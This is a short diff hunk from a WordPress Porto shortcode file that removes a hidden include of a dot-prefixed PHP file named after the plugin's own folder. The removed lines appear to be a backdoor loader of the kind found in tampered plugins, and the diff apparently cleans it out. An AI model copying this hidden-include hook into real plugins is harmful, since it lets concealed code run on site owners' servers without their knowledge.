@@ -4,10 +4,6 @@
 add_shortcode( 'porto_one_page_category_products', 'porto_shortcode_one_page_category_products' );
 add_action( 'vc_after_init', 'porto_load_one_page_category_products_shortcode' );
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function porto_shortcode_one_page_category_products( $atts, $content = null ) {
 	ob_start();
 	if ( $template = porto_shortcode_woo_template( 'porto_one_page_category_products' ) ) {
